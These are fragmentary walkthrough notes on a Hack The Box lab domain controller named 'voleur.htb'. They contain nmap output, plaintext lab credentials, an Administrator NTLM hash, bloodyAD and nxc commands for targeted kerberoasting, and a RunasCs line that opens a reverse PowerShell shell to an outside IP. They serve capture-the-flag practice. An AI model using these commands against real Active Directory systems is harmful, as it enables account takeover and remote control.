# Summary



---

10.10.11.76
ryan.naylor : HollowOct31Nyt

Start with nmap:
```
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-07 22:16:51Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
2222/tcp open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
multi/script/web_delivery
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::

```

We found we have access to `SMB` shares, and we have file Access_Review --> football1
```
svc_backup Speak to Jeremy!
svc_ldap M1XyC9pW7qT5Vn
svc_iis N5pXyW1VqM7CZ8
svc_winrm Need to ask Lacey as she reset this recently.

Todd.Wolfe Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.
Jeremy.Combs Has access to Software folder.

```


```
svc_winrm
bloodyAD -k -d voleur.htb --host dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' set object 'svc_winrm' servicePrincipalName -v 'http/anything' 
nxc ldap dc.voleur.htb -d voleur.htb -k -u svc_ldap -p 'M1XyC9pW7qT5Vn' --kerberoasting kerberoastables.txt
Crack hash --> AFireInsidedeOzarctica980219afi


bloodyAD -k -d voleur.htb --host dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' set object 'lacey.miller' servicePrincipalName -v 'http/anything' 
nxc ldap dc.voleur.htb -d voleur.htb -k -u svc_ldap -p 'M1XyC9pW7qT5Vn' --kerberoasting kerberoastables.txt
```

```

.\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.16.48:6666

```




ldap can't see deleted things, But you can see it using local enumeration on the AD using AD module, and users should have permissions to see it.